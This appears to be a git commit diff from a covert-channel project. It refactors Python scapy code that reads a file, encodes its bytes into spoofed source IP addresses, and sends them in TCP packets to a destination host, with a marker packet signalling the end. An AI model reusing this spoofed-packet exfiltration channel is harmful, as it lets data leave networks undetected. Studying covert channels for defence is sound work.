6a5a279bec78051037c0c65fafd50d9bce525c2c
unknown <Peters-account>
2022-04-19 18:14:57 -0500

    Global testing

--- DGCC.py
+++ DGCC.py
@@ -1,5 +1,5 @@
 from peterFitness import fitnessFunction
-from jack import *
+from frontEnd import *
 from TargetSocketTiming import socketTiming
 from TargetActiveStorage  import activeStorage
 # from TargetPiggybackStorage import piggybackStorage
@@ -12,22 +12,22 @@ if __name__ == "__main__":
     trafficThreshold=1024
 
 
-    filepath = "D:/HI.txt"
-    ip_addr = "google.com"
-
+    filepath = "Hi.txt"
+##    ip_addr = "google.com"
     isPingHigh, isSizeHigh, isTrafficHigh = fitnessFunction(ip_addr, filepath, pingThreshhold, sizeThreshhold, trafficThreshold)
 
-    isSizeHigh = False
-    isPingHigh = False
+    isSizeHigh = True
+    isPingHigh = True
+    isTrafficHigh = False
+    
 
     print("hi")
+
     if (not isSizeHigh and not isPingHigh):
         socketTiming(port, filepath)
-        print("bye")
         
     elif (isTrafficHigh):
         piggybackStorage(ip_addr, port, filepath)
 
     else:
-        pass
-        # activeStorage(ip_addr, port, filepath)
+        activeStorage(ip_addr, port, filepath)
--- TargetActiveStorage.py
+++ TargetActiveStorage.py
@@ -7,33 +7,33 @@ from piggybackEncodeDecodeIP import *
 conf.promisc = False
 
 
-
-spoffed_ip = "138.47.50.50"
-EOF = "69.69.69.69"
-port = 10010
-ip_host = "138.47.140.93"
-
-
-covertBin = []
-with open("D:/HI.txt", "rb") as f:
-    covert = f.read()
-for line in covert:
-    covertBin.append(bin(line)[2:].zfill(8))
+def activeStorage(ip_addr, port, filepath):
+    spoffed_ip = "138.47.50.50"
+    EOF = "69.69.69.69"
+    port = port
+    ip_host = ip_addr
 
 
-
-
-for j in range (len(covertBin)):
-    srcip= encodeIP(spoffed_ip, covertBin[j], j)
-    packet=(IP(dst= ip_host, src= srcip)/TCP(sport = port))
-    sentpacket= sr1(packet,retry = 0, timeout = 1)
+    covertBin = []
+    with open(filepath, "rb") as f:
+        covert = f.read()
+    for line in covert:
+        covertBin.append(bin(line)[2:].zfill(8))
 
 
 
 
-#srcip= encodeIP(spoffed_ip, covertBin[13], 13)
-#packet=(IP(dst="138.47.140.93", src= srcip )/TCP(sport = port))
-#sentpacket = sr1(packet, retry = 0, timeout = 1)
+    for j in range (len(covertBin)):
+        srcip= encodeIP(spoffed_ip, covertBin[j], j)
+        packet=(IP(dst= ip_host, src= srcip)/TCP(sport = port))
+        sentpacket= sr1(packet,retry = 0, timeout = 1)
 
-pac=(IP(dst=ip_host, src= EOF)/TCP(sport = port))
-sent = sr1(pac,retry = 0, timeout = 1)
+
+
+
+    #srcip= encodeIP(spoffed_ip, covertBin[13], 13)
+    #packet=(IP(dst="138.47.140.93", src= srcip )/TCP(sport = port))
+    #sentpacket = sr1(packet, retry = 0, timeout = 1)
+
+    pac=(IP(dst=ip_host, src= EOF)/TCP(sport = port))
+    sent = sr1(pac,retry = 0, timeout = 1)
